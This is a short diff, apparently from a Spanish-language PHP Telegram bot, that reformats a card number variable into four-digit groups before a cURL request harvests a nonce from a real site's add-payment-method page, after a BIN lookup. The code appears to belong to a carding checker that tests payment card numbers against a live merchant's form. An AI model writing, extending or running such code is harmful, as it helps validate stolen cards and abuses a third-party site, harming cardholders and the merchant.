@@ -2770,11 +2770,18 @@ sendMessage($chat_id,$respuesta, $message_id);
 $id_text = file_get_contents("ID");
         //----------------------------------------------------//
 
-
+$longitud = 4;
+$partes = [];
+for ($i = 0; $i < strlen($cc); $i += $longitud) {
+    $parte = substr($cc, $i, $longitud);
+    $partes[] = $parte;
+}
+	
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
 ////EXTRAE EL NONCE////
+$cc = implode('+', $partes);
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://hoamemberservices.com/my-account/add-payment-method/',
